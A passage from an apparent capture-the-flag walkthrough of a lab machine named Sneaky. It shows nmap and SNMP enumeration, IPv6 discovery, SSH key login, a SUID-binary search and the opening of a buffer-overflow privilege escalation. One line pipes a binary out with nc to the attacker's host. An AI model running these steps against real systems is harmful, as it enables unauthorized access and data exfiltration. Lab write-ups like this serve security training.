443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:D7:6E (VMware)

Nmap scan report for fe80::250:56ff:fe8f:c237
Host is up (0.00018s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:C2:37 (VMware)

Nmap scan report for fe80::250:56ff:fe8f:fa4b
Host is up (0.00014s latency).

PORT     STATE    SERVICE
22/tcp   open     ssh
443/tcp  open     https
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server
MAC Address: 00:50:56:8F:FA:4B (VMware)

Nmap scan report for fe80::250:56ff:fe8f:8262
Host is up (0.00027s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:82:62 (VMware)

Nmap scan report for fe80::250:56ff:fe8f:9c92
Host is up (0.00033s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:9C:92 (VMware)

Nmap scan report for fe80::d420:f590:3abc:76f6
Host is up (0.00029s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  open   https
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:DB:D9 (VMware)

Nmap scan report for fe80::250:56ff:fe8f:1299
Host is up (0.00038s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:12:99 (VMware)

Nmap scan report for fe80::288c:1b7c:4d75:c027
Host is up (0.00024s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  closed https
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:5B:80 (VMware)

Nmap scan report for fe80::250:56ff:fe8f:1ecd
Host is up (0.00016s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:1E:CD (VMware)

Nmap scan report for fe80::250:56ff:fe8f:6524
Host is up (0.00028s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  open   https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:65:24 (VMware)

Nmap scan report for fe80::907:5aa:214d:4dc8
Host is up (0.00052s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  closed https
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:19:CC (VMware)

Nmap scan report for fe80::250:56ff:fe8f:fbdf
Host is up (0.00013s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:FB:DF (VMware)

Nmap scan report for fe80::250:56ff:fe8f:65
Host is up (0.00017s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:00:65 (VMware)

Nmap scan report for fe80::250:56ff:fe8f:64fe
Host is up (0.00019s latency).

PORT     STATE    SERVICE
22/tcp   filtered ssh
443/tcp  filtered https
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server
MAC Address: 00:50:56:8F:64:FE (VMware)

Nmap scan report for fe80::250:56ff:fe8f:239e
Host is up (0.00029s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:23:9E (VMware)

Nmap scan report for fe80::250:56ff:fe8f:7100
Host is up (0.00020s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  open   https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:71:00 (VMware)

Nmap scan report for fe80::250:56ff:fe8f:1e33
Host is up (0.00023s latency).

PORT     STATE    SERVICE
22/tcp   open     ssh
443/tcp  closed   https
445/tcp  filtered microsoft-ds
3389/tcp filtered ms-wbt-server
MAC Address: 00:50:56:8F:1E:33 (VMware)

Nmap scan report for fe80::250:56ff:fe8f:d32c
Host is up (0.050s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:D3:2C (VMware)

Nmap scan report for fe80::250:56ff:fe8f:cd94
Host is up (0.00020s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:CD:94 (VMware)

Nmap scan report for fe80::250:56ff:fe8f:29df
Host is up (0.00031s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
443/tcp  closed https
445/tcp  closed microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:50:56:8F:29:DF (VMware)

Nmap done: 42 IP addresses (40 hosts up) scanned in 2.68 seconds
root@bashed:~#
```

###### SNMP Enumeration

```sh
root@kali:~/sneaky# snmpwalk -v2c -c public 10.10.10.20
iso.3.6.1.2.1.1.1.0 = STRING: "Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (24862755) 2 days, 21:03:47.55
iso.3.6.1.2.1.1.4.0 = STRING: "root"
iso.3.6.1.2.1.1.5.0 = STRING: "Sneaky"
iso.3.6.1.2.1.1.6.0 = STRING: "Unknown"
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.2.1.0 = INTEGER: 2
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2
iso.3.6.1.2.1.2.2.1.2.1 = STRING: "lo"
iso.3.6.1.2.1.2.2.1.2.2 = STRING: "eth0"
iso.3.6.1.2.1.2.2.1.3.1 = INTEGER: 24
iso.3.6.1.2.1.2.2.1.3.2 = INTEGER: 6
iso.3.6.1.2.1.2.2.1.4.1 = INTEGER: 65536
iso.3.6.1.2.1.2.2.1.4.2 = INTEGER: 1500
iso.3.6.1.2.1.2.2.1.5.1 = Gauge32: 10000000
iso.3.6.1.2.1.2.2.1.5.2 = Gauge32: 4294967295
iso.3.6.1.2.1.2.2.1.6.1 = ""
iso.3.6.1.2.1.2.2.1.6.2 = Hex-STRING: 00 50 56 8F D7 6E
iso.3.6.1.2.1.2.2.1.7.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.7.2 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.8.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.8.2 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.9.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.2.2.1.9.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.2.2.1.10.1 = Counter32: 454720
iso.3.6.1.2.1.2.2.1.10.2 = Counter32: 116085165
iso.3.6.1.2.1.2.2.1.11.1 = Counter32: 4480
iso.3.6.1.2.1.2.2.1.11.2 = Counter32: 1377812
iso.3.6.1.2.1.2.2.1.12.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.12.2 = Counter32: 765
iso.3.6.1.2.1.2.2.1.13.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.13.2 = Counter32: 88
iso.3.6.1.2.1.2.2.1.14.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.14.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.15.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.15.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.16.1 = Counter32: 454720
iso.3.6.1.2.1.2.2.1.16.2 = Counter32: 158101316
iso.3.6.1.2.1.2.2.1.17.1 = Counter32: 4480
iso.3.6.1.2.1.2.2.1.17.2 = Counter32: 889430
iso.3.6.1.2.1.2.2.1.18.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.18.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.19.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.19.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.20.1 = Counter32: 0
iso.3.6.1.2.1.2.2.1.20.2 = Counter32: 0
iso.3.6.1.2.1.2.2.1.21.1 = Gauge32: 0
iso.3.6.1.2.1.2.2.1.21.2 = Gauge32: 0
iso.3.6.1.2.1.2.2.1.22.1 = OID: ccitt.0
iso.3.6.1.2.1.2.2.1.22.2 = OID: ccitt.0
iso.3.6.1.2.1.3.1.1.1.2.1.10.10.10.2 = INTEGER: 2
iso.3.6.1.2.1.3.1.1.1.2.1.10.10.10.68 = INTEGER: 2
iso.3.6.1.2.1.3.1.1.2.2.1.10.10.10.2 = Hex-STRING: 00 50 56 8F 64 FE
iso.3.6.1.2.1.3.1.1.2.2.1.10.10.10.68 = Hex-STRING: 00 50 56 8F 39 EA
iso.3.6.1.2.1.3.1.1.3.2.1.10.10.10.2 = IpAddress: 10.10.10.2
iso.3.6.1.2.1.3.1.1.3.2.1.10.10.10.68 = IpAddress: 10.10.10.68
iso.3.6.1.2.1.4.1.0 = INTEGER: 2
iso.3.6.1.2.1.4.2.0 = INTEGER: 64
iso.3.6.1.2.1.4.3.0 = Counter32: 1367646
iso.3.6.1.2.1.4.4.0 = Counter32: 0
iso.3.6.1.2.1.4.5.0 = Counter32: 0
iso.3.6.1.2.1.4.6.0 = Counter32: 0
iso.3.6.1.2.1.4.7.0 = Counter32: 0
iso.3.6.1.2.1.4.8.0 = Counter32: 0
iso.3.6.1.2.1.4.9.0 = Counter32: 1367646
iso.3.6.1.2.1.4.10.0 = Counter32: 889109
iso.3.6.1.2.1.4.11.0 = Counter32: 0
iso.3.6.1.2.1.4.12.0 = Counter32: 0
iso.3.6.1.2.1.4.13.0 = INTEGER: 30
iso.3.6.1.2.1.4.14.0 = Counter32: 0
iso.3.6.1.2.1.4.15.0 = Counter32: 0
iso.3.6.1.2.1.4.16.0 = Counter32: 0
iso.3.6.1.2.1.4.17.0 = Counter32: 0
iso.3.6.1.2.1.4.18.0 = Counter32: 0
iso.3.6.1.2.1.4.19.0 = Counter32: 0
iso.3.6.1.2.1.4.20.1.1.10.10.10.20 = IpAddress: 10.10.10.20
iso.3.6.1.2.1.4.20.1.1.127.0.0.1 = IpAddress: 127.0.0.1
iso.3.6.1.2.1.4.20.1.2.10.10.10.20 = INTEGER: 2
iso.3.6.1.2.1.4.20.1.2.127.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.20.1.3.10.10.10.20 = IpAddress: 255.255.255.0
iso.3.6.1.2.1.4.20.1.3.127.0.0.1 = IpAddress: 255.0.0.0
iso.3.6.1.2.1.4.20.1.4.10.10.10.20 = INTEGER: 1
iso.3.6.1.2.1.4.20.1.4.127.0.0.1 = INTEGER: 0
iso.3.6.1.2.1.4.21.1.1.0.0.0.0 = IpAddress: 0.0.0.0
iso.3.6.1.2.1.4.21.1.1.10.10.10.0 = IpAddress: 10.10.10.0
iso.3.6.1.2.1.4.21.1.2.0.0.0.0 = INTEGER: 2
iso.3.6.1.2.1.4.21.1.2.10.10.10.0 = INTEGER: 2
iso.3.6.1.2.1.4.21.1.3.0.0.0.0 = INTEGER: 1
iso.3.6.1.2.1.4.21.1.3.10.10.10.0 = INTEGER: 0
iso.3.6.1.2.1.4.21.1.7.0.0.0.0 = IpAddress: 10.10.10.2
iso.3.6.1.2.1.4.21.1.7.10.10.10.0 = IpAddress: 0.0.0.0
iso.3.6.1.2.1.4.21.1.8.0.0.0.0 = INTEGER: 4
iso.3.6.1.2.1.4.21.1.8.10.10.10.0 = INTEGER: 3
iso.3.6.1.2.1.4.21.1.9.0.0.0.0 = INTEGER: 2
iso.3.6.1.2.1.4.21.1.9.10.10.10.0 = INTEGER: 2
iso.3.6.1.2.1.4.21.1.11.0.0.0.0 = IpAddress: 0.0.0.0
iso.3.6.1.2.1.4.21.1.11.10.10.10.0 = IpAddress: 255.255.255.0
iso.3.6.1.2.1.4.21.1.13.0.0.0.0 = OID: ccitt.0
iso.3.6.1.2.1.4.21.1.13.10.10.10.0 = OID: ccitt.0
iso.3.6.1.2.1.4.22.1.1.2.10.10.10.2 = INTEGER: 2
iso.3.6.1.2.1.4.22.1.1.2.10.10.10.68 = INTEGER: 2
iso.3.6.1.2.1.4.22.1.2.2.10.10.10.2 = Hex-STRING: 00 50 56 8F 64 FE
iso.3.6.1.2.1.4.22.1.2.2.10.10.10.68 = Hex-STRING: 00 50 56 8F 39 EA
iso.3.6.1.2.1.4.22.1.3.2.10.10.10.2 = IpAddress: 10.10.10.2
iso.3.6.1.2.1.4.22.1.3.2.10.10.10.68 = IpAddress: 10.10.10.68
iso.3.6.1.2.1.4.22.1.4.2.10.10.10.2 = INTEGER: 3
iso.3.6.1.2.1.4.22.1.4.2.10.10.10.68 = INTEGER: 3
iso.3.6.1.2.1.4.23.0 = Counter32: 0
iso.3.6.1.2.1.4.24.4.1.1.0.0.0.0.0.0.0.0.0.10.10.10.2 = IpAddress: 0.0.0.0
iso.3.6.1.2.1.4.24.4.1.1.10.10.10.0.255.255.255.0.0.0.0.0.0 = IpAddress: 10.10.10.0
iso.3.6.1.2.1.4.24.4.1.2.0.0.0.0.0.0.0.0.0.10.10.10.2 = IpAddress: 0.0.0.0
iso.3.6.1.2.1.4.24.4.1.2.10.10.10.0.255.255.255.0.0.0.0.0.0 = IpAddress: 255.255.255.0
iso.3.6.1.2.1.4.24.4.1.3.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: 0
iso.3.6.1.2.1.4.24.4.1.3.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: 0
iso.3.6.1.2.1.4.24.4.1.4.0.0.0.0.0.0.0.0.0.10.10.10.2 = IpAddress: 10.10.10.2
iso.3.6.1.2.1.4.24.4.1.4.10.10.10.0.255.255.255.0.0.0.0.0.0 = IpAddress: 0.0.0.0
iso.3.6.1.2.1.4.24.4.1.5.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: 2
iso.3.6.1.2.1.4.24.4.1.5.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: 2
iso.3.6.1.2.1.4.24.4.1.6.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: 4
iso.3.6.1.2.1.4.24.4.1.6.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: 3
iso.3.6.1.2.1.4.24.4.1.7.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: 2
iso.3.6.1.2.1.4.24.4.1.7.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: 2
iso.3.6.1.2.1.4.24.4.1.9.0.0.0.0.0.0.0.0.0.10.10.10.2 = OID: ccitt.0
iso.3.6.1.2.1.4.24.4.1.9.10.10.10.0.255.255.255.0.0.0.0.0.0 = OID: ccitt.0
iso.3.6.1.2.1.4.24.4.1.10.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: 0
iso.3.6.1.2.1.4.24.4.1.10.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: 0
iso.3.6.1.2.1.4.24.4.1.11.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: 0
iso.3.6.1.2.1.4.24.4.1.11.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: 0
iso.3.6.1.2.1.4.24.4.1.12.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: -1
iso.3.6.1.2.1.4.24.4.1.12.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: -1
iso.3.6.1.2.1.4.24.4.1.13.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: -1
iso.3.6.1.2.1.4.24.4.1.13.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: -1
iso.3.6.1.2.1.4.24.4.1.14.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: -1
iso.3.6.1.2.1.4.24.4.1.14.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: -1
iso.3.6.1.2.1.4.24.4.1.15.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: -1
iso.3.6.1.2.1.4.24.4.1.15.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: -1
iso.3.6.1.2.1.4.24.4.1.16.0.0.0.0.0.0.0.0.0.10.10.10.2 = INTEGER: 1
iso.3.6.1.2.1.4.24.4.1.16.10.10.10.0.255.255.255.0.0.0.0.0.0 = INTEGER: 1
iso.3.6.1.2.1.4.24.6.0 = Gauge32: 8
iso.3.6.1.2.1.4.24.7.1.7.1.4.0.0.0.0.0.2.0.0.1.4.10.10.10.2 = INTEGER: 2
iso.3.6.1.2.1.4.24.7.1.7.1.4.10.10.10.0.24.3.0.0.2.1.4.0.0.0.0 = INTEGER: 2
iso.3.6.1.2.1.4.24.7.1.7.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.3.0.0.4.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.143.100.254 = INTEGER: 2
iso.3.6.1.2.1.4.24.7.1.7.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1.128.3.0.0.6.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0 = INTEGER: 1
<---SNIP---->
```

```sh
root@kali:~/sneaky# snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.3
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.20 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.143.215.110 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.143.215.110 = INTEGER: 2
root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# python
Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34)
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(222)
'0xde'
>>> hex(173)
'0xad'
>>>
root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# apt install snmp-mibs-downloader
```

```sh
root@kali:~/sneaky# cat /etc/snmp/snmp.conf
# As the snmp packages come without MIB files due to license reasons, loading
# of MIBs is disabled by default. If you added the MIBs you can reenable
# loading them by commenting out the following line.
# mibs :
root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# snmpwalk -v2c -c public 10.10.10.20 > snmpwalk-v6
```

```sh
root@kali:~/sneaky# snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.3
IP-MIB::ipAddressIfIndex.ipv4."10.10.10.20" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv4."10.10.10.255" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv4."127.0.0.1" = INTEGER: 1
IP-MIB::ipAddressIfIndex.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: 1
IP-MIB::ipAddressIfIndex.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:8f:d7:6e" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:8f:d7:6e" = INTEGER: 2
root@kali:~/sneaky#
```

[`Enyx`](https://github.com/trickster0/Enyx)

```sh
root@kali:~/sneaky# git clone https://github.com/trickster0/Enyx.git
Cloning into 'Enyx'...
remote: Counting objects: 70, done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 70 (delta 1), reused 0 (delta 0), pack-reused 58
Unpacking objects: 100% (70/70), done.
root@kali:~/sneaky# cd Enyx/
root@kali:~/sneaky/Enyx# ls -l
# As the snmp packages come without MIB files due to license reasons, loading
total 684
-rw-r--r-- 1 root root 688559 Jun  6 19:42 enyx.png
-rw-r--r-- 1 root root   2613 Jun  6 19:42 enyx.py
-rw-r--r-- 1 root root   1443 Jun  6 19:42 README.md
root@kali:~/sneaky/Enyx# python enyx.py
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################


[+] Usage: enyx.py snmpversion communitystring IP
[+] snmpversion can be either 1 or 2c

root@kali:~/sneaky/Enyx#
root@kali:~/sneaky/Enyx# python enyx.py 2c public 10.10.10.20
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################


[+] Snmpwalk found.
[+] Grabbing IPv6.
[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:fe8f:d76e
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:fe8f:d76e
root@kali:~/sneaky/Enyx#
```

```sh
root@kali:~/sneaky# chmod 600 thrasivoulos.key
root@kali:~/sneaky# ssh -i thrasivoulos.key thrasivoulos@dead:beef:0000:0000:0250:56ff:fe8f:d76e
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Jun  7 00:58:26 EEST 2018

  System load:  0.0               Processes:           162
  Usage of /:   9.6% of 18.58GB   Users logged in:     0
  Memory usage: 14%               IP address for eth0: 10.10.10.20
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Thu Jun  7 00:58:26 2018 from fe80::250:56ff:fe8f:39ea%eth0
thrasivoulos@Sneaky:~$
```

###### Privilege Escalation using buffer overflow

```sh
thrasivoulos@Sneaky:~$ find / -user root -perm -4000 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/usr/local/bin/chal
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
thrasivoulos@Sneaky:~$
```

```sh
thrasivoulos@Sneaky:~$ file /usr/local/bin/chal
/usr/local/bin/chal: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped
thrasivoulos@Sneaky:~$
```

```sh
thrasivoulos@Sneaky:~$ /usr/local/bin/chal
Segmentation fault (core dumped)
thrasivoulos@Sneaky:~$
```

```sh
thrasivoulos@Sneaky:~$ base64 /usr/local/bin/chal | nc 10.10.14.16 8081
```

```sh
root@kali:~/sneaky# nc -nlvp 8081 > chal.b64
listening on [any] 8081 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.20] 55322
root@kali:~/sneaky# base64 -d chal.b64 > chal
root@kali:~/sneaky# chmod +x chal
root@kali:~/sneaky# ./chal
Segmentation fault
root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# gdb ./chal -q
Reading symbols from ./chal...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
gdb-peda$
```

```sh
thrasivoulos@Sneaky:~$ /usr/local/bin/chal a
```

```sh
root@kali:~/sneaky# /usr/bin/msf-pattern_create -l 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
root@kali:~/sneaky#
```

```sh
thrasivoulos@Sneaky:~$ gdb /usr/local/bin/chal -q
Reading symbols from /usr/local/bin/chal...(no debugging symbols found)...done.
